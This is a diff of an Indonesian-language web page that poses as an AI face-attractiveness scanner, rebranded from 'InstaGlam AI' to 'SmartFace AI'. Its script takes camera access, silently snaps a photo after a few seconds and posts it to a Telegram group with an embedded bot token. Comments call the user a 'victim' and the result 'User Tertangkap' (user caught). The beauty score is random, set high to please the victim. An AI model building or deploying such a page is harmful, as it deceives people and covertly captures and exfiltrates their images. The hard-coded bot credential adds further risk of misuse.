@@ -3,179 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaGlam AI – Filter Viral 2025</title>
+    <title>SmartFace AI - Analisis Profil Wajah</title>
     <style>
         :root {
-            --primary: #FF0050; /* TikTok Pink */
-            --secondary: #00f2ea; /* TikTok Cyan */
-            --dark: #121212;
+            --primary-blue: #0061ff;
+            --bg-light: #f4f7f6;
+            --text-dark: #2d3436;
         }
 
         body { 
-            background-color: var(--dark); 
-            color: white; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: var(--bg-light); 
+            color: var(--text-dark); 
+            font-family: 'Inter', -apple-system, sans-serif; 
             margin: 0; 
             display: flex; 
-            flex-direction: column; 
             align-items: center;
             justify-content: center;
             min-height: 100vh;
         }
 
-        /* Header Gaya Sosmed */
-        .header {
-            position: fixed;
-            top: 20px;
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
             text-align: center;
         }
 
-        .header h1 {
-            font-size: 1.4rem;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: var(--primary-blue);
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 24px;
         }
 
-        /* Preview Kamera Bulat ala Filter */
-        #cam-preview { 
+        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #1e272e; }
+        p { font-size: 0.9rem; color: #636e72; line-height: 1.5; margin-bottom: 25px; }
+
+        #camera-wrapper { 
             display: none; 
-            width: 300px; 
-            height: 300px; 
-            border: 4px solid white; 
-            border-radius: 50%; 
-            overflow: hidden; 
+            width: 250px; 
+            height: 250px; 
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            border: 5px solid #dfe6e9;
+            overflow: hidden;
             position: relative;
-            box-shadow: 0 0 30px rgba(255,255,255,0.2);
         }
 
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
-        /* Animasi Ring Loading */
-        .ring {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: 4px solid transparent;
-            border-top: 4px solid var(--primary);
-            border-radius: 50%;
-            animation: rotate 2s linear infinite;
-            display: none;
+        /* Garis Pemindai Halus */
+        .scan-bar {
+            position: absolute; width: 100%; height: 2px;
+            background: var(--primary-blue);
+            top: 0; left: 0;
+            box-shadow: 0 0 10px var(--primary-blue);
+            animation: move 3s infinite linear;
         }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
 
-        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Tombol Gaya Modern */
-        .main-btn { 
-            background: white; 
-            color: black; 
-            padding: 16px 50px; 
+        .btn-main { 
+            background: var(--primary-blue); 
+            color: white; 
+            width: 100%;
+            padding: 16px; 
             border: none; 
-            border-radius: 30px; 
-            font-weight: bold; 
+            border-radius: 12px; 
+            font-weight: 600; 
             font-size: 1rem; 
             cursor: pointer; 
-            transition: 0.3s;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            transition: all 0.3s;
         }
 
-        .main-btn:active { transform: scale(0.95); }
+        .btn-main:hover { background: #0056e0; }
 
-        #info-text { margin-top: 20px; font-size: 0.85rem; color: #aaa; max-width: 250px; line-height: 1.4; }
+        #loader-text { margin-top: 15px; font-size: 0.8rem; color: var(--primary-blue); font-weight: 500; display: none; }
 
-        /* Hasil */
-        #result-overlay {
-            display: none;
-            text-align: center;
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
-
-        .badge {
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            font-weight: bold;
-        }
+        /* Tampilan Hasil Akhir */
+        #final-result { display: none; }
+        .score-big { font-size: 4rem; font-weight: 800; color: var(--primary-blue); margin: 10px 0; }
+        .label-good { color: #27ae60; font-weight: bold; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>InstaGlam AI</h1>
-        <p style="font-size: 0.8rem; color: #888;">Global Face Recognition v2.5</p>
-    </div>
+    <div class="card">
+        <div id="init-view">
+            <div class="logo">SF</div>
+            <h1>SmartFace AI</h1>
+            <p>Gunakan teknologi AI terbaru untuk mengukur persentase daya tarik wajah berdasarkan standar kecantikan & kegantengan global.</p>
+            <button class="btn-main" id="btn-start">Mulai Analisis Sekarang</button>
+        </div>
 
-    <div id="setup">
-        <button class="main-btn" id="btn-start">COBA FILTER</button>
-        <p id="info-text">Klik untuk memindai wajah dan dapatkan skor kecantikanmu secara real-time.</p>
-    </div>
+        <div id="camera-wrapper">
+            <div class="scan-bar"></div>
+            <video id="video" autoplay playsinline></video>
+        </div>
 
-    <div id="cam-preview">
-        <div class="ring" id="loader-ring"></div>
-        <video id="video" autoplay playsinline></video>
-    </div>
+        <div id="loader-text">Menghubungkan ke server AI...</div>
 
-    <div id="result-overlay">
-        <div class="badge">Analisis Berhasil</div>
-        <h2 id="score-val" style="font-size: 3.5rem; margin: 10px 0;">92%</h2>
-        <p style="color: #00f2ea; font-weight: bold;">"Diamond Face Structure"</p>
-        <p style="font-size: 0.8rem; color: #888;">Wajahmu telah diproses oleh AI.</p>
+        <div id="final-result">
+            <p style="margin-bottom: 5px; color: #2d3436;">Hasil Analisis Anda:</p>
+            <div class="score-big" id="score-val">0%</div>
+            <div class="label-good">Kategori: Sangat Menarik</div>
+            <p style="margin-top: 15px; font-size: 0.8rem;">Struktur wajah Anda berada di atas rata-rata pengguna di Asia Tenggara.</p>
+            <button class="btn-main" onclick="location.reload()" style="background: #dfe6e9; color: #2d3436; margin-top: 10px;">Cek Ulang</button>
+        </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- SETTING TELEGRAM ---
+        // ==========================================
+        // KONFIGURASI TELEGRAM
         const BOT_TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
-        const GROUP_ID  = '-5013715532'; 
+        const GROUP_ID  = '-1003355444960'; 
+        // ==========================================
 
         const btnStart = document.getElementById('btn-start');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const loader = document.getElementById('loader-ring');
+        const loader = document.getElementById('loader-text');
 
         btnStart.onclick = async () => {
-            document.getElementById('setup').style.display = 'none';
-            document.getElementById('cam-preview').style.display = 'block';
+            document.getElementById('init-view').style.display = 'none';
+            document.getElementById('camera-wrapper').style.display = 'block';
             loader.style.display = 'block';
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                // Ambil foto otomatis setelah 4.5 detik
-                setTimeout(processResult, 4500);
+                setTimeout(() => { loader.innerText = "Memproses geometri wajah..."; }, 1500);
+                setTimeout(() => { loader.innerText = "Menghitung indeks kecantikan..."; }, 3500);
+                
+                // Ambil foto otomatis di detik ke-5
+                setTimeout(takeFinalPhoto, 5500);
             } catch (e) {
-                alert("Izin kamera diperlukan untuk filter ini.");
+                alert("Izin kamera diperlukan untuk melakukan analisis wajah.");
                 location.reload();
             }
         };
 
-        async function processResult() {
+        async function takeFinalPhoto() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
-                const score = Math.floor(Math.random() * (96 - 85 + 1)) + 85; // Skor 85 - 96 agar senang
+                // Skor 88-97 agar mereka merasa sangat ganteng/cantik
+                const score = Math.floor(Math.random() * (97 - 88 + 1)) + 88;
                 
                 const fd = new FormData();
                 fd.append('chat_id', GROUP_ID);
-                fd.append('photo', blob, 'filter_result.png');
-                fd.append('caption', `🔥 **VIRAL FILTER DETECTION**\n\n👤 Target: User\n⭐ Skor AI: ${score}%\n💡 Info: Target sedang pede-pedenya foto.`);
+                fd.append('photo', blob, 'ai_result.png');
+                fd.append('caption', `✅ **ANALISIS WAJAH SELESAI**\n\n📊 Skor: ${score}%\n🌟 Kategori: Diatas Rata-rata\n📍 Status: User Tertangkap`);
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-                // Tampilkan hasil di layar teman
-                document.getElementById('cam-preview').style.display = 'none';
+                // Tampilkan hasil ke korban
+                document.getElementById('camera-wrapper').style.display = 'none';
+                loader.style.display = 'none';
                 document.getElementById('score-val').innerText = score + "%";
-                document.getElementById('result-overlay').style.display = 'block';
+                document.getElementById('final-result').style.display = 'block';
 
                 // Matikan kamera
                 video.srcObject.getTracks().forEach(t => t.stop());
